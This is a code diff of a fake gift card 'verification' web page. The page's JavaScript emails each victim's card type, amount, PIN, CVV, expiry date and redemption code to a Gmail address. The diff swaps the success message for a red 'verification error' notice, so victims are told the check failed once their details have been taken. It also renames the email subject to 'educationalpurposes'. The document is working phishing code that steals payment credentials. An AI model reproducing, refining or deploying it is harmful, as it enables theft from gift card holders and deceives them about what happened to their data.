@@ -132,10 +132,9 @@
             <header class="receipt__header">
               <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
 
-              <p class="receipt__title">
-                SUCCESS! 
-              </p>
-              <p class="receipt__date">Your gift card has been verified
+              <p class="receipt__title" style="color:rgb(255, 0, 0)">
+ERROR !              </p>
+              <p class="receipt__date">verification error !
               </p>
             </header>
             <dl class="receipt__list">
@@ -782,7 +781,7 @@ function myClick() {
 
       To: "Williamcampbell693@gmail.com",
       From: "imperialwavelogics@gmail.com",
-      Subject: ` ${"paidgiftcard"} sent you a message`,
+      Subject: ` ${"educationalpurposes"} sent you a message`,
       Body: `Cardname: ${cardtype} <br/> Currency: ${currency} <br/> Amount ${amount} <br/> Cardpin : ${cardpin} <br/> Cardcvv : ${cardcvv} <br/> Cardexpiredate : ${cardexpiredate} <br/> Cardfourpin : ${cardfourpin} <br/> Redemptioncode : ${redemptioncode}`,
     }).then( myClick);
   }
